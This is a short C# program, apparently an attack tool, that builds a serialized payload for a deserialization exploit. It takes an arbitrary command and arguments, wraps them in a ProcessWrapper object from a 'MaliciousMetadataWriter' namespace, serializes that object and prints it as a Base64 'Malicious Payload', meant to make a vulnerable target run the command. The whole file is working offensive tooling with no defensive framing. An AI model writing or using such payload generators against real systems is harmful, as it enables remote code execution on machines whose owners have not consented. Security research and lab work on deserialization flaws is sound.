using MaliciousMetadataWriter;


class PayloadGenerator
{
    static void Main(string[] args)
    {
        if (args.Length < 2) 
        {
            Console.WriteLine("Usage: dotnet run <Command> <Arguments>");
            return;
        }

        var FileName = args[0];
        var Arguments = string.Join(" ", args[1..]);

        var maliciousProcess = new ProcessWrapper
        {
            FileName = FileName,
            Arguments = Arguments
        };

        byte[] serializedPayload = maliciousProcess.Serialize();

        string base64Payload = Convert.ToBase64String(serializedPayload);

        Console.WriteLine("Malicious Payload (Base64):");
        Console.WriteLine(base64Payload);
    }
}
